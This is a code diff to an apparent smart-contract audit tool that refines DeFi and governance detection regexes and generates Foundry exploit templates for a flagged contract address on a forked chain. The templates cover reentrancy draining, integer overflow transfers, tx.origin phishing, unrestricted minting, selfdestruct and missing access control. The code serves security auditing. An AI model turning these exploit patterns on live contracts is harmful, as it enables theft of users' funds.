@@ -244,10 +244,21 @@ export function analyzeEconomicAttacks(
   }
 ): EconomicAttackVector[] {
   const src = sourceCode.toLowerCase()
-  const isDeFi    = /swap|liquidity|pool|vault|stake|borrow|lend|amm/.test(src)
+  const isDeFi = (
+    /function\s+swap|function\s+addLiquidity|function\s+removeLiquidity/i.test(src) ||
+    /function\s+deposit|function\s+withdraw|function\s+borrow/i.test(src) ||
+    /IUniswap|IPancakeRouter|IPool|IVault/i.test(src)
+  )
   const hasOracle = /chainlink|oracle|price.*feed|latestanswer|getlatestprice|twap/.test(src)
-  const hasGov    = /governance|proposal|vote|timelock|quorum/.test(src)
-  const hasLiq    = /liquidity|addliquidity|removeliquidity|pair/.test(src)
+  const hasGov = (
+    /function\s+propose\s*\(|function\s+vote\s*\(|function\s+castVote\s*\(/i.test(src) ||
+    /function\s+queue\s*\(|function\s+execute\s*\(|TimelockController/i.test(src) ||
+    (/governance|IGovernor|GovernorBravo/i.test(src) && /function\s+\w+\s*\(/i.test(src))
+  )
+  const hasLiq = (
+    /function\s+addLiquidity|function\s+removeLiquidity/i.test(src) ||
+    /IUniswapV[23]Pair|IPancakePair/i.test(src)
+  )
 
   return [
     {
@@ -360,10 +371,15 @@ export function generateFoundryPoC(
   contractName: string,
   contractAddress: string,
 ): string {
+  // Sanitize address
+  const addr = contractAddress && contractAddress.startsWith("0x") && contractAddress.length >= 10
+    ? contractAddress
+    : "0x_REPLACE_WITH_CONTRACT_ADDRESS"
+
   const t = findingTitle.toLowerCase()
   const header = [
     "// SPDX-License-Identifier: MIT",
-    'pragma solidity ^0.8.20;',
+    "pragma solidity ^0.8.20;",
     'import "forge-std/Test.sol";',
     "",
   ].join("\n")
@@ -371,9 +387,9 @@ export function generateFoundryPoC(
   if (t.includes("reentrancy")) {
     return [
       header,
-      "// Solay39 PoC - Reentrancy",
+      "// Solay39 PoC — Reentrancy",
       "// Finding: " + findingTitle,
-      "// Target: " + contractName + " @ " + contractAddress,
+      "// Target: " + contractName + " @ " + addr,
       "",
       "interface ITarget { function withdraw() external; function deposit() external payable; }",
       "",
@@ -393,10 +409,10 @@ export function generateFoundryPoC(
       "contract ReentrancyTest is Test {",
       "    function testExploit() public {",
       '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
-      "        ReentrancyAttacker atk = new ReentrancyAttacker(" + contractAddress + ");",
-      "        uint before = address(" + contractAddress + ").balance;",
+      "        ReentrancyAttacker atk = new ReentrancyAttacker(" + addr + ");",
+      "        uint before = address(" + addr + ").balance;",
       "        atk.attack{value: 1 ether}();",
-      '        assertLt(address(' + contractAddress + ').balance, before, "Reentrancy drained funds");',
+      '        assertLt(address(' + addr + ').balance, before, "Reentrancy drained funds");',
       "    }",
       "}",
     ].join("\n")
@@ -405,16 +421,19 @@ export function generateFoundryPoC(
   if (t.includes("overflow") || t.includes("underflow")) {
     return [
       header,
-      "// Solay39 PoC - Integer Overflow/Underflow",
+      "// Solay39 PoC — Integer Overflow/Underflow",
       "// Finding: " + findingTitle,
-      "// Target: " + contractName + " @ " + contractAddress,
+      "// Target: " + contractName + " @ " + addr,
       "",
-      "interface IToken { function transfer(address, uint256) external returns (bool); function balanceOf(address) external view returns (uint256); }",
+      "interface IToken {",
+      "    function transfer(address, uint256) external returns (bool);",
+      "    function balanceOf(address) external view returns (uint256);",
+      "}",
       "",
       "contract OverflowTest is Test {",
       "    function testExploit() public {",
       '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
-      "        IToken token = IToken(" + contractAddress + ");",
+      "        IToken token = IToken(" + addr + ");",
       '        address attacker = makeAddr("attacker");',
       "        vm.prank(attacker);",
       "        token.transfer(address(this), type(uint256).max);",
@@ -427,9 +446,9 @@ export function generateFoundryPoC(
   if (t.includes("tx.origin")) {
     return [
       header,
-      "// Solay39 PoC - tx.origin Phishing",
+      "// Solay39 PoC — tx.origin Phishing",
       "// Finding: " + findingTitle,
-      "// Target: " + contractName + " @ " + contractAddress,
+      "// Target: " + contractName + " @ " + addr,
       "",
       "interface ITarget { function adminFunction() external; }",
       "",
@@ -442,8 +461,9 @@ export function generateFoundryPoC(
       "contract TxOriginTest is Test {",
       "    function testExploit() public {",
       '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
+      "        // Replace with actual owner address from BscScan/Etherscan",
       "        address owner = address(0x1234);",
-      "        PhishingContract phisher = new PhishingContract(" + contractAddress + ");",
+      "        PhishingContract phisher = new PhishingContract(" + addr + ");",
       "        vm.prank(owner, owner);",
       "        phisher.lure();",
       "    }",
@@ -451,19 +471,22 @@ export function generateFoundryPoC(
     ].join("\n")
   }
 
-  if (t.includes("mint") && t.includes("unrestricted")) {
+  if (t.includes("unrestricted") && t.includes("mint")) {
     return [
       header,
-      "// Solay39 PoC - Unrestricted Mint",
+      "// Solay39 PoC — Unrestricted Mint",
       "// Finding: " + findingTitle,
-      "// Target: " + contractName + " @ " + contractAddress,
+      "// Target: " + contractName + " @ " + addr,
       "",
-      "interface IToken { function mint(address, uint256) external; function totalSupply() external view returns (uint256); }",
+      "interface IToken {",
+      "    function mint(address, uint256) external;",
+      "    function totalSupply() external view returns (uint256);",
+      "}",
       "",
       "contract UnrestrictedMintTest is Test {",
       "    function testExploit() public {",
       '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
-      "        IToken token = IToken(" + contractAddress + ");",
+      "        IToken token = IToken(" + addr + ");",
       '        address attacker = makeAddr("attacker");',
       "        uint256 before = token.totalSupply();",
       "        vm.prank(attacker);",
@@ -474,19 +497,73 @@ export function generateFoundryPoC(
     ].join("\n")
   }
 
-  // Generic template
+  if (t.includes("selfdestruct") || t.includes("self destruct")) {
+    return [
+      header,
+      "// Solay39 PoC — Self Destruct",
+      "// Finding: " + findingTitle,
+      "// Target: " + contractName + " @ " + addr,
+      "",
+      "interface ITarget { function destroy() external; }",
+      "interface IOwnable { function owner() external view returns (address); }",
+      "",
+      "contract SelfDestructTest is Test {",
+      "    function testExploit() public {",
+      '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
+      "        ITarget target = ITarget(" + addr + ");",
+      "        uint256 codeSizeBefore;",
+      "        assembly { codeSizeBefore := extcodesize(" + addr + ") }",
+      "        // Prank as owner",
+      "        address owner = IOwnable(" + addr + ").owner();",
+      "        vm.prank(owner);",
+      "        target.destroy();",
+      "        uint256 codeSizeAfter;",
+      "        assembly { codeSizeAfter := extcodesize(" + addr + ") }",
+      '        assertEq(codeSizeAfter, 0, "Contract destroyed");',
+      "    }",
+      "}",
+    ].join("\n")
+  }
+
+  if (t.includes("access control")) {
+    return [
+      header,
+      "// Solay39 PoC — Missing Access Control",
+      "// Finding: " + findingTitle,
+      "// Target: " + contractName + " @ " + addr,
+      "",
+      "interface ITarget { function privilegedFunction() external; }",
+      "",
+      "contract AccessControlTest is Test {",
+      "    function testExploit() public {",
+      '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
+      "        ITarget target = ITarget(" + addr + ");",
+      '        address attacker = makeAddr("attacker");',
+      "        // Should revert — if it does not, access control is missing",
+      "        vm.prank(attacker);",
+      "        target.privilegedFunction();",
+      "    }",
+      "}",
+    ].join("\n")
+  }
+
+  // Generic fallback
   return [
     header,
-    "// Solay39 PoC - " + findingTitle,
-    "// Target: " + contractName + " @ " + contractAddress,
+    "// Solay39 PoC — " + findingTitle,
+    "// Target: " + contractName + " @ " + addr,
     "",
     "contract PoCTest is Test {",
+    "    address constant TARGET = " + addr + ";",
+    "",
     "    function testExploit() public {",
     '        vm.createSelectFork(vm.envString("ETH_RPC_URL"));',
-    "        // TODO: implement exploit for: " + findingTitle,
-    "        // 1. Setup attack conditions",
-    "        // 2. Execute vulnerability",
-    "        // 3. Assert impact (balance / state change)",
+    "        // Target: " + addr,
+    "        // Implement exploit steps for: " + findingTitle,
+    "        // 1. Setup attack preconditions",
+    "        // 2. Execute vulnerable function",
+    "        // 3. Assert impact (balance change / state corruption)",
+    "        // Run: forge test --match-test testExploit -vvvv",
     "    }",
     "}",
   ].join("\n")
